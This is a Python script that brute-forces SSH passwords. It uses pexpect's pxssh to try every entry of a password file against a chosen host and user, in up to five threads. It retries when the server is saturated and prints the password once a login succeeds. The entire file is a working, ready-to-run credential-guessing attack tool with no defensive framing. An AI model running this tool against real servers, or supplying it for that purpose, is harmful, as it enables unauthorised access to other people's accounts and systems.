from pexpect import pxssh					#included in pexpect's library and is specific to ssh
import argparse
import time
from threading import *

maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
Found = False
Fails = 0

def connect(host, user, password, release):
	global Found
	global Fails
	try:
		s = pxssh.pxssh()
		s.login(host, user, password)
		print('[+] Password Found: ' + password)
		Found = True
	except Exception as e:
		if 'read_nonblocking' in str(e):						#assume the SSH server is maxed out at the number of connections
			Fails += 1
			time.sleep(5)										#sleep for 5 seconds before trying again with same pass
			connect(host, user, password, False)
		elif 'synchronize with original prompt' in str(e):
			time.sleep(1)
			connect(host, user, password, False)
	finally:
		if release: connection_lock.release()
			
def main():
	parser = argparse.ArgumentParser(description='Brute forces passwords on ssh server')	
	parser.add_argument('-H', required=True, help='specify target host')					
	parser.add_argument('-F', required=True, help='specify password file')
	parser.add_argument('-u', required=True, help='specify the user')
	args = parser.parse_args()
	
	host = args.H
	passwdFile = args.F
	user = args.u	
	fn = open(passwdFile, 'r')
	
	for line in fn.readlines():
		if Found:
			print('[*] Exiting: Password Found')
			exit(0)
		if Fails > 5:
			print('[!] Exiting: Too Many Socket Timouts')
			exit(0)
			
		connection_lock.acquire()
		password = line.strip('\r').strip('\n')
		print('[-] Testing: ' + str(password))
		t = Thread(target=connect, args=(host, user, password, True))
		child = t.start()
	
	time.sleep(2)
	if not Found:
		print('[*] Exiting: Password not found')



if __name__ == '__main__':
	main()

